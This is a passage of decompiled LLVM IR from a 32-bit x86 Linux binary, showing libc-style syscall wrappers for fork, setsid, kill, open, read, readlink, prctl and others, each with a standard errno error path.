  br label %dec_label_pc_804fa34

; uselistorder directives
  uselistorder i32 %v1_804fa3a, { 1, 0 }
  uselistorder i32 %v1_804fa39, { 1, 0 }
  uselistorder i32 %v1_804fa24, { 0, 1, 3, 2 }
  uselistorder i32 %v3_804fa19, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder i32 %div20, { 1, 2, 0 }
  uselistorder i32 %v1_804fa0b, { 1, 0 }
  uselistorder i32 %v4_804f9cb, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 7, 8 }
  uselistorder i8 45, { 2, 0, 1 }
  uselistorder i32 %arg3, { 5, 2, 3, 4, 6, 7, 0, 1, 8, 9, 10 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fa34, { 0, 2, 1 }
}

define i32 @function_804fa8d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fa8d:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804fa8d = load i32, i32* @edi, align 4
  %v0_804fa8e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804faa2 = add i32 %arg2, -12
  %v6_804faac = icmp ugt i32 %v1_804faa2, 2
  br i1 %v6_804faac, label %dec_label_pc_804fabc, label %dec_label_pc_804faae

dec_label_pc_804faae:                             ; preds = %dec_label_pc_804fa8d
  %v4_804fab2 = call i32 @function_804fae4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804faa2)
  br label %dec_label_pc_804fade

dec_label_pc_804fabc:                             ; preds = %dec_label_pc_804fa8d
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804fac4 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804fac4, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_804fac4, -4095
  br i1 %tmp17, label %dec_label_pc_804fadc, label %dec_label_pc_804fad0

dec_label_pc_804fad0:                             ; preds = %dec_label_pc_804fabc
  %v1_804fad0 = call i32 @function_8050089(i32 %v0_804fa8e)
  %v0_804fad5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fad5 = sub i32 0, %v0_804fad5
  %v2_804fad7 = inttoptr i32 %v1_804fad0 to i32*
  store i32 %v1_804fad5, i32* %v2_804fad7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fadc

dec_label_pc_804fadc:                             ; preds = %dec_label_pc_804fabc, %dec_label_pc_804fad0
  %v0_804fadc = phi i32 [ %v2_804fac4, %dec_label_pc_804fabc ], [ -1, %dec_label_pc_804fad0 ]
  br label %dec_label_pc_804fade

dec_label_pc_804fade:                             ; preds = %dec_label_pc_804faae, %dec_label_pc_804fadc
  %v0_804fae3 = phi i32 [ %v4_804fab2, %dec_label_pc_804faae ], [ %v0_804fadc, %dec_label_pc_804fadc ]
  store i32 %v0_804fa8e, i32* @ebx, align 4
  store i32 %v0_804fa8d, i32* @edi, align 4
  ret i32 %v0_804fae3

; uselistorder directives
  uselistorder i32 %v2_804fac4, { 1, 0, 2 }
  uselistorder i32 %v0_804fa8e, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804fade, { 1, 0 }
  uselistorder label %dec_label_pc_804fadc, { 1, 0 }
}

define i32 @function_804fae4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fae4:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fae4 = load i32, i32* @edi, align 4
  store i32 %v0_804fae4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fafc = load i32, i32* @ebx, align 4
  %v1_804fb04 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804fb04, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_804fb04, -4095
  br i1 %tmp12, label %dec_label_pc_804fb1c, label %dec_label_pc_804fb10

dec_label_pc_804fb10:                             ; preds = %dec_label_pc_804fae4
  %v1_804fb10 = call i32 @function_8050089(i32 %v0_804fafc)
  %v0_804fb15 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fb15 = sub i32 0, %v0_804fb15
  %v2_804fb17 = inttoptr i32 %v1_804fb10 to i32*
  store i32 %v1_804fb15, i32* %v2_804fb17, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fb21.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fb1c

dec_label_pc_804fb1c:                             ; preds = %dec_label_pc_804fae4, %dec_label_pc_804fb10
  %v2_804fb21 = phi i32 [ %v0_804fae4, %dec_label_pc_804fae4 ], [ %v2_804fb21.pre, %dec_label_pc_804fb10 ]
  %v0_804fb1c = phi i32 [ %v1_804fb04, %dec_label_pc_804fae4 ], [ -1, %dec_label_pc_804fb10 ]
  store i32 %v2_804fb21, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fb1c

; uselistorder directives
  uselistorder i32 %v1_804fb04, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fb1c, { 1, 0 }
}

define i32 @function_804fb23(i8* %arg1) local_unnamed_addr {
dec_label_pc_804fb23:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb23 = load i32, i32* @edi, align 4
  store i32 %v0_804fb23, i32* %stack_var_-4, align 4
  %v4_804fb27 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fb27, i32* %edi.global-to-local, align 4
  %v0_804fb2b = load i32, i32* @ebx, align 4
  %v3_804fb33 = call i32 @chdir(i8* %arg1)
  store i32 %v3_804fb33, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_804fb33, -4095
  br i1 %tmp9, label %dec_label_pc_804fb4b, label %dec_label_pc_804fb3f

dec_label_pc_804fb3f:                             ; preds = %dec_label_pc_804fb23
  %v1_804fb3f = call i32 @function_8050089(i32 %v0_804fb2b)
  %v0_804fb44 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fb44 = sub i32 0, %v0_804fb44
  %v2_804fb46 = inttoptr i32 %v1_804fb3f to i32*
  store i32 %v1_804fb44, i32* %v2_804fb46, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fb4f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fb4b

dec_label_pc_804fb4b:                             ; preds = %dec_label_pc_804fb23, %dec_label_pc_804fb3f
  %v2_804fb4f = phi i32 [ %v0_804fb23, %dec_label_pc_804fb23 ], [ %v2_804fb4f.pre, %dec_label_pc_804fb3f ]
  %v0_804fb4b = phi i32 [ %v3_804fb33, %dec_label_pc_804fb23 ], [ -1, %dec_label_pc_804fb3f ]
  store i32 %v2_804fb4f, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fb4b

; uselistorder directives
  uselistorder i32 %v3_804fb33, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fb4b, { 1, 0 }
}

define i32 @function_804fb51(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fb51:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb51 = load i32, i32* @edi, align 4
  store i32 %v0_804fb51, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fb59 = load i32, i32* @ebx, align 4
  %v1_804fb61 = call i32 @close(i32 %arg1)
  store i32 %v0_804fb59, i32* @ebx, align 4
  store i32 %v1_804fb61, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_804fb61, -4095
  br i1 %tmp9, label %dec_label_pc_804fb79, label %dec_label_pc_804fb6d

dec_label_pc_804fb6d:                             ; preds = %dec_label_pc_804fb51
  %v1_804fb6d = call i32 @function_8050089(i32 %v0_804fb59)
  %v0_804fb72 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fb72 = sub i32 0, %v0_804fb72
  %v2_804fb74 = inttoptr i32 %v1_804fb6d to i32*
  store i32 %v1_804fb72, i32* %v2_804fb74, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fb7d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fb79

dec_label_pc_804fb79:                             ; preds = %dec_label_pc_804fb51, %dec_label_pc_804fb6d
  %v2_804fb7d = phi i32 [ %v0_804fb51, %dec_label_pc_804fb51 ], [ %v2_804fb7d.pre, %dec_label_pc_804fb6d ]
  %v0_804fb79 = phi i32 [ %v1_804fb61, %dec_label_pc_804fb51 ], [ -1, %dec_label_pc_804fb6d ]
  %v2_804fb7b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fb7b, i32* @edx, align 4
  store i32 %v2_804fb7d, i32* @edi, align 4
  ret i32 %v0_804fb79

; uselistorder directives
  uselistorder i32 %v1_804fb61, { 1, 0, 2 }
  uselistorder i32 %v0_804fb59, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fb79, { 1, 0 }
}

define i32 @function_804fb7f() local_unnamed_addr {
dec_label_pc_804fb7f:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb7f = load i32, i32* @ebx, align 4
  store i32 %v0_804fb7f, i32* %stack_var_-4, align 4
  %v1_804fb88 = call i32 @fork(i32 %v0_804fb7f)
  store i32 %v1_804fb88, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804fb88, -4095
  br i1 %tmp7, label %dec_label_pc_804fb9f, label %dec_label_pc_804fb93

dec_label_pc_804fb93:                             ; preds = %dec_label_pc_804fb7f
  %v1_804fb93 = call i32 @function_8050089(i32 %v0_804fb7f)
  %v0_804fb98 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fb98 = sub i32 0, %v0_804fb98
  %v2_804fb9a = inttoptr i32 %v1_804fb93 to i32*
  store i32 %v1_804fb98, i32* %v2_804fb9a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fba3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fb9f

dec_label_pc_804fb9f:                             ; preds = %dec_label_pc_804fb7f, %dec_label_pc_804fb93
  %v2_804fba3 = phi i32 [ %v0_804fb7f, %dec_label_pc_804fb7f ], [ %v2_804fba3.pre, %dec_label_pc_804fb93 ]
  %v0_804fb9f = phi i32 [ %v1_804fb88, %dec_label_pc_804fb7f ], [ -1, %dec_label_pc_804fb93 ]
  store i32 %v2_804fba3, i32* @ebx, align 4
  ret i32 %v0_804fb9f

; uselistorder directives
  uselistorder i32 %v1_804fb88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fb9f, { 1, 0 }
}

define i32 @function_804fba5() local_unnamed_addr {
dec_label_pc_804fba5:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fba5 = load i32, i32* @ebx, align 4
  store i32 %v0_804fba5, i32* %stack_var_-4, align 4
  %v1_804fbae = call i32 @getpid(i32 %v0_804fba5)
  store i32 %v1_804fbae, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804fbae, -4095
  br i1 %tmp7, label %dec_label_pc_804fbc5, label %dec_label_pc_804fbb9

dec_label_pc_804fbb9:                             ; preds = %dec_label_pc_804fba5
  %v1_804fbb9 = call i32 @function_8050089(i32 %v0_804fba5)
  %v0_804fbbe = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fbbe = sub i32 0, %v0_804fbbe
  %v2_804fbc0 = inttoptr i32 %v1_804fbb9 to i32*
  store i32 %v1_804fbbe, i32* %v2_804fbc0, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fbc9.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fbc5

dec_label_pc_804fbc5:                             ; preds = %dec_label_pc_804fba5, %dec_label_pc_804fbb9
  %v2_804fbc9 = phi i32 [ %v0_804fba5, %dec_label_pc_804fba5 ], [ %v2_804fbc9.pre, %dec_label_pc_804fbb9 ]
  %v0_804fbc5 = phi i32 [ %v1_804fbae, %dec_label_pc_804fba5 ], [ -1, %dec_label_pc_804fbb9 ]
  %v2_804fbc7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fbc7, i32* @edx, align 4
  store i32 %v2_804fbc9, i32* @ebx, align 4
  ret i32 %v0_804fbc5

; uselistorder directives
  uselistorder i32 %v1_804fbae, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fbc5, { 1, 0 }
}

define i32 @function_804fbcb() local_unnamed_addr {
dec_label_pc_804fbcb:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fbcb = load i32, i32* @ebx, align 4
  store i32 %v0_804fbcb, i32* %stack_var_-4, align 4
  %v1_804fbd4 = call i32 @getppid(i32 %v0_804fbcb)
  store i32 %v1_804fbd4, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804fbd4, -4095
  br i1 %tmp7, label %dec_label_pc_804fbeb, label %dec_label_pc_804fbdf

dec_label_pc_804fbdf:                             ; preds = %dec_label_pc_804fbcb
  %v1_804fbdf = call i32 @function_8050089(i32 %v0_804fbcb)
  %v0_804fbe4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fbe4 = sub i32 0, %v0_804fbe4
  %v2_804fbe6 = inttoptr i32 %v1_804fbdf to i32*
  store i32 %v1_804fbe4, i32* %v2_804fbe6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fbef.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fbeb

dec_label_pc_804fbeb:                             ; preds = %dec_label_pc_804fbcb, %dec_label_pc_804fbdf
  %v2_804fbef = phi i32 [ %v0_804fbcb, %dec_label_pc_804fbcb ], [ %v2_804fbef.pre, %dec_label_pc_804fbdf ]
  %v0_804fbeb = phi i32 [ %v1_804fbd4, %dec_label_pc_804fbcb ], [ -1, %dec_label_pc_804fbdf ]
  %v2_804fbed = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fbed, i32* @edx, align 4
  store i32 %v2_804fbef, i32* @ebx, align 4
  ret i32 %v0_804fbeb

; uselistorder directives
  uselistorder i32 %v1_804fbd4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fbeb, { 1, 0 }
}

define i32 @function_804fbf1(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fbf1:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fbf1 = load i32, i32* @edi, align 4
  store i32 %v0_804fbf1, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fc09 = load i32, i32* @ebx, align 4
  %v2_804fc11 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_804fc11, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_804fc11, -4095
  br i1 %tmp12, label %dec_label_pc_804fc29, label %dec_label_pc_804fc1d

dec_label_pc_804fc1d:                             ; preds = %dec_label_pc_804fbf1
  %v1_804fc1d = call i32 @function_8050089(i32 %v0_804fc09)
  %v0_804fc22 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fc22 = sub i32 0, %v0_804fc22
  %v2_804fc24 = inttoptr i32 %v1_804fc1d to i32*
  store i32 %v1_804fc22, i32* %v2_804fc24, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fc2e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fc29

dec_label_pc_804fc29:                             ; preds = %dec_label_pc_804fbf1, %dec_label_pc_804fc1d
  %v2_804fc2e = phi i32 [ %v0_804fbf1, %dec_label_pc_804fbf1 ], [ %v2_804fc2e.pre, %dec_label_pc_804fc1d ]
  %v0_804fc29 = phi i32 [ %v2_804fc11, %dec_label_pc_804fbf1 ], [ -1, %dec_label_pc_804fc1d ]
  store i32 %v2_804fc2e, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fc29

; uselistorder directives
  uselistorder i32 %v2_804fc11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fc29, { 1, 0 }
}

define i32 @function_804fc30(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fc30:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fc30 = load i32, i32* @ebx, align 4
  store i32 %v0_804fc30, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804fc43 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_804fc43, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804fc43, -4095
  br i1 %tmp9, label %dec_label_pc_804fc5c, label %dec_label_pc_804fc50

dec_label_pc_804fc50:                             ; preds = %dec_label_pc_804fc30
  %v1_804fc50 = call i32 @function_8050089(i32 %v0_804fc30)
  %v0_804fc55 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fc55 = sub i32 0, %v0_804fc55
  %v2_804fc57 = inttoptr i32 %v1_804fc50 to i32*
  store i32 %v1_804fc55, i32* %v2_804fc57, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fc60.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fc5c

dec_label_pc_804fc5c:                             ; preds = %dec_label_pc_804fc30, %dec_label_pc_804fc50
  %v2_804fc60 = phi i32 [ %v0_804fc30, %dec_label_pc_804fc30 ], [ %v2_804fc60.pre, %dec_label_pc_804fc50 ]
  %v0_804fc5c = phi i32 [ %v2_804fc43, %dec_label_pc_804fc30 ], [ -1, %dec_label_pc_804fc50 ]
  %v2_804fc5e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fc5e, i32* @edx, align 4
  store i32 %v2_804fc60, i32* @ebx, align 4
  ret i32 %v0_804fc5c

; uselistorder directives
  uselistorder i32 %v2_804fc43, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fc5c, { 1, 0 }
}

define i32 @function_804fc62(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804fc62:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_804fc63 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804fc69 = sdiv i32 %sext, 16777216
  store i32 %v4_804fc69, i32* @ecx, align 4
  %v4_804fc6d = ptrtoint i8* %arg1 to i32
  %v3_804fc71 = and i32 %arg2, 64
  %v4_804fc71 = icmp eq i32 %v3_804fc71, 0
  br i1 %v4_804fc71, label %dec_label_pc_804fc82, label %dec_label_pc_804fc76

dec_label_pc_804fc76:                             ; preds = %dec_label_pc_804fc62
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_804fc82

dec_label_pc_804fc82:                             ; preds = %dec_label_pc_804fc62, %dec_label_pc_804fc76
  %v0_804fc82 = phi i32 [ 0, %dec_label_pc_804fc62 ], [ %phitmp, %dec_label_pc_804fc76 ]
  store i32 %v0_804fc82, i32* @edx, align 4
  store i32 %v4_804fc6d, i32* %ebx.global-to-local, align 4
  %v5_804fc8d = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804fc69)
  store i32 %v5_804fc8d, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804fc8d, -4095
  br i1 %tmp15, label %dec_label_pc_804fca5, label %dec_label_pc_804fc99

dec_label_pc_804fc99:                             ; preds = %dec_label_pc_804fc82
  %v1_804fc99 = call i32 @function_8050089(i32 %v0_804fc63)
  %v0_804fc9e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fc9e = sub i32 0, %v0_804fc9e
  %v2_804fca0 = inttoptr i32 %v1_804fc99 to i32*
  store i32 %v1_804fc9e, i32* %v2_804fca0, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fca5

dec_label_pc_804fca5:                             ; preds = %dec_label_pc_804fc82, %dec_label_pc_804fc99
  %v0_804fca5 = phi i32 [ %v5_804fc8d, %dec_label_pc_804fc82 ], [ -1, %dec_label_pc_804fc99 ]
  store i32 %v0_804fc63, i32* @ebx, align 4
  ret i32 %v0_804fca5

; uselistorder directives
  uselistorder i32 %v5_804fc8d, { 1, 0, 2 }
  uselistorder i32 %v4_804fc69, { 1, 0 }
  uselistorder i32 %v0_804fc63, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804fca5, { 1, 0 }
  uselistorder label %dec_label_pc_804fc82, { 1, 0 }
}

define i32 @function_804fcad(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804fcad:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804fcae = load i32, i32* @esi, align 4
  store i32 %v0_804fcae, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804fcc6 = load i32, i32* @ebx, align 4
  %v5_804fcce = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  store i32 %v5_804fcce, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v5_804fcce, -4095
  br i1 %tmp12, label %dec_label_pc_804fce6, label %dec_label_pc_804fcda

dec_label_pc_804fcda:                             ; preds = %dec_label_pc_804fcad
  %v1_804fcda = call i32 @function_8050089(i32 %v0_804fcc6)
  %v0_804fcdf = load i32, i32* %esi.global-to-local, align 4
  %v1_804fcdf = sub i32 0, %v0_804fcdf
  %v2_804fce1 = inttoptr i32 %v1_804fcda to i32*
  store i32 %v1_804fcdf, i32* %v2_804fce1, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_804fce9.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804fce6

dec_label_pc_804fce6:                             ; preds = %dec_label_pc_804fcad, %dec_label_pc_804fcda
  %v2_804fce9 = phi i32 [ %v0_804fcae, %dec_label_pc_804fcad ], [ %v2_804fce9.pre, %dec_label_pc_804fcda ]
  %v0_804fce6 = phi i32 [ %v5_804fcce, %dec_label_pc_804fcad ], [ -1, %dec_label_pc_804fcda ]
  store i32 %v2_804fce9, i32* %esi.global-to-local, align 4
  ret i32 %v0_804fce6

; uselistorder directives
  uselistorder i32 %v5_804fcce, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fce6, { 1, 0 }
}

define i32 @function_804fcec(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fcec:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fcec = load i32, i32* @edi, align 4
  store i32 %v0_804fcec, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fcfc = load i32, i32* @ebx, align 4
  %v4_804fd04 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804fcfc, i32* @ebx, align 4
  store i32 %v4_804fd04, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_804fd04, -4095
  br i1 %tmp12, label %dec_label_pc_804fd1c, label %dec_label_pc_804fd10

dec_label_pc_804fd10:                             ; preds = %dec_label_pc_804fcec
  %v1_804fd10 = call i32 @function_8050089(i32 %v0_804fcfc)
  %v0_804fd15 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fd15 = sub i32 0, %v0_804fd15
  %v2_804fd17 = inttoptr i32 %v1_804fd10 to i32*
  store i32 %v1_804fd15, i32* %v2_804fd17, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fd20.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fd1c

dec_label_pc_804fd1c:                             ; preds = %dec_label_pc_804fcec, %dec_label_pc_804fd10
  %v2_804fd20 = phi i32 [ %v0_804fcec, %dec_label_pc_804fcec ], [ %v2_804fd20.pre, %dec_label_pc_804fd10 ]
  %v0_804fd1c = phi i32 [ %v4_804fd04, %dec_label_pc_804fcec ], [ -1, %dec_label_pc_804fd10 ]
  store i32 %v2_804fd20, i32* @edi, align 4
  ret i32 %v0_804fd1c

; uselistorder directives
  uselistorder i32 %v4_804fd04, { 1, 0, 2 }
  uselistorder i32 %v0_804fcfc, { 1, 0 }
  uselistorder label %dec_label_pc_804fd1c, { 1, 0 }
}

define i32 @function_804fd22(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fd22:
  %edi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to i8*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fd22 = load i32, i32* @edi, align 4
  store i32 %v0_804fd22, i32* %stack_var_-4, align 4
  %v4_804fd26 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fd26, i32* %edi.global-to-local, align 4
  %v0_804fd32 = load i32, i32* @ebx, align 4
  %v7_804fd3a = call i32 @readlink(i8* %arg1, i8* %tmp5, i32 %arg3)
  store i32 %v0_804fd32, i32* @ebx, align 4
  store i32 %v7_804fd3a, i32* %edi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_804fd3a, -4095
  br i1 %tmp13, label %dec_label_pc_804fd52, label %dec_label_pc_804fd46

dec_label_pc_804fd46:                             ; preds = %dec_label_pc_804fd22
  %v1_804fd46 = call i32 @function_8050089(i32 %v0_804fd32)
  %v0_804fd4b = load i32, i32* %edi.global-to-local, align 4
  %v1_804fd4b = sub i32 0, %v0_804fd4b
  %v2_804fd4d = inttoptr i32 %v1_804fd46 to i32*
  store i32 %v1_804fd4b, i32* %v2_804fd4d, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fd56.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fd52

dec_label_pc_804fd52:                             ; preds = %dec_label_pc_804fd22, %dec_label_pc_804fd46
  %v2_804fd56 = phi i32 [ %v0_804fd22, %dec_label_pc_804fd22 ], [ %v2_804fd56.pre, %dec_label_pc_804fd46 ]
  %v0_804fd52 = phi i32 [ %v7_804fd3a, %dec_label_pc_804fd22 ], [ -1, %dec_label_pc_804fd46 ]
  %v2_804fd54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fd54, i32* @edx, align 4
  store i32 %v2_804fd56, i32* @edi, align 4
  ret i32 %v0_804fd52

; uselistorder directives
  uselistorder i32 %v7_804fd3a, { 1, 0, 2 }
  uselistorder i32 %v0_804fd32, { 1, 0 }
  uselistorder label %dec_label_pc_804fd52, { 1, 0 }
}

define i32 @function_804fd58() local_unnamed_addr {
dec_label_pc_804fd58:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804fd59 = load i32, i32* @esi, align 4
  store i32 %v0_804fd59, i32* %stack_var_-8, align 4
  %v0_804fd71 = load i32, i32* @ebx, align 4
  %v1_804fd79 = call i32 @int80_syscall(i32 142)
  store i32 %v0_804fd71, i32* @ebx, align 4
  store i32 %v1_804fd79, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_804fd79, -4095
  br i1 %tmp12, label %dec_label_pc_804fd91, label %dec_label_pc_804fd85

dec_label_pc_804fd85:                             ; preds = %dec_label_pc_804fd58
  %v1_804fd85 = call i32 @function_8050089(i32 %v0_804fd71)
  %v0_804fd8a = load i32, i32* %esi.global-to-local, align 4
  %v1_804fd8a = sub i32 0, %v0_804fd8a
  %v2_804fd8c = inttoptr i32 %v1_804fd85 to i32*
  store i32 %v1_804fd8a, i32* %v2_804fd8c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_804fd94.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804fd91

dec_label_pc_804fd91:                             ; preds = %dec_label_pc_804fd58, %dec_label_pc_804fd85
  %v2_804fd94 = phi i32 [ %v0_804fd59, %dec_label_pc_804fd58 ], [ %v2_804fd94.pre, %dec_label_pc_804fd85 ]
  %v0_804fd91 = phi i32 [ %v1_804fd79, %dec_label_pc_804fd58 ], [ -1, %dec_label_pc_804fd85 ]
  store i32 %v2_804fd94, i32* @esi, align 4
  ret i32 %v0_804fd91

; uselistorder directives
  uselistorder i32 %v1_804fd79, { 1, 0, 2 }
  uselistorder i32 %v0_804fd71, { 1, 0 }
  uselistorder label %dec_label_pc_804fd91, { 1, 0 }
}

define i32 @function_804fd97() local_unnamed_addr {
dec_label_pc_804fd97:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fd97 = load i32, i32* @ebx, align 4
  store i32 %v0_804fd97, i32* %stack_var_-4, align 4
  %v1_804fda0 = call i32 @setsid(i32 %v0_804fd97)
  store i32 %v1_804fda0, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804fda0, -4095
  br i1 %tmp7, label %dec_label_pc_804fdb7, label %dec_label_pc_804fdab

dec_label_pc_804fdab:                             ; preds = %dec_label_pc_804fd97
